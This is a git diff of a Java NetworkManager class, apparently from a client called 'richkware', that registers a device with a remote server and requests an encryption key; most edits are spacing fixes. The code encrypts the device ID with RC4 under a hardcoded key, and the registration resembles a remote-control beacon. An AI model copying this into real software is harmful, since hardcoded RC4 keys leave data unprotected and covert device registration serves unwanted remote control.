@@ -29,9 +29,13 @@ public class NetworkManager {
 
             JSONObject payload = new JSONObject();
             // device ID
-            payload.put("data0", RC4.encrypt(DeviceInfo.getDeviceID(context),"richktest"));
-            payload.put("data1", RC4.encrypt("none","richktest"));
-            payload.put("data2", RC4.encrypt("richk@i.it","richktest"));
+            payload.put("data0", RC4.encrypt(DeviceInfo.getDeviceID(context), "richktest"));
+            // data
+            JSONObject dataPayload = new JSONObject();
+            dataPayload.put("serverPort", "none");
+            dataPayload.put("associatedUser", "richk@i.it");
+            payload.put("data", RC4.encrypt(dataPayload.toString(), "richktest"));
+            // channel
             payload.put("channel", "richkware");
 
             network.putRequest("device", payload.toString(), null, new NetworkCallback() {
@@ -43,7 +47,7 @@ public class NetworkManager {
                         else
                             callback.onFailure(ResponseParser.parseMessage(response));
                     } catch (JSONException e) {
-                        NotificationManager.notify(context, NotificationType.TOAST_SHORT,e.getMessage());
+                        NotificationManager.notify(context, NotificationType.TOAST_SHORT, e.getMessage());
                         e.printStackTrace();
                     }
                 }
@@ -53,8 +57,8 @@ public class NetworkManager {
                     callback.onFailure(e.getMessage());
                 }
             });
-        }catch (Exception e){
-            NotificationManager.notify(context, NotificationType.TOAST_SHORT,e.getMessage());
+        } catch (Exception e) {
+            NotificationManager.notify(context, NotificationType.TOAST_SHORT, e.getMessage());
             e.printStackTrace();
         }
     }
@@ -65,10 +69,10 @@ public class NetworkManager {
 
             JSONObject payload = new JSONObject();
             // device ID
-            payload.put("id", RC4.encrypt(DeviceInfo.getDeviceID(context),"richktest"));
+            payload.put("id", RC4.encrypt(DeviceInfo.getDeviceID(context), "richktest"));
             payload.put("channel", "richkware");
 
-            network.getRequest("encryptionKey", payload.toString(),"",null, new NetworkCallback() {
+            network.getRequest("encryptionKey", payload.toString(), "", null, new NetworkCallback() {
                 @Override
                 public void onSuccess(String response) {
                     try {
@@ -77,7 +81,7 @@ public class NetworkManager {
                         else
                             callback.onFailure(ResponseParser.parseMessage(response));
                     } catch (JSONException e) {
-                        NotificationManager.notify(context, NotificationType.TOAST_SHORT,e.getMessage());
+                        NotificationManager.notify(context, NotificationType.TOAST_SHORT, e.getMessage());
                         e.printStackTrace();
                     }
                 }
@@ -87,8 +91,8 @@ public class NetworkManager {
                     callback.onFailure(e.getMessage());
                 }
             });
-        }catch (Exception e){
-            NotificationManager.notify(context, NotificationType.TOAST_SHORT,e.getMessage());
+        } catch (Exception e) {
+            NotificationManager.notify(context, NotificationType.TOAST_SHORT, e.getMessage());
             e.printStackTrace();
         }
     }
@@ -98,6 +102,6 @@ public class NetworkManager {
         String port = protocol.equalsIgnoreCase("HTTPS") ? "443" : "8080";
         String server = StorageManager.read(context, StorageKey.NETWORK_SERVER);
         String service = StorageManager.read(context, StorageKey.NETWORK_SERVICE);
-        network.setURL(protocol,server,port,service);
+        network.setURL(protocol, server, port, service);
     }
 }
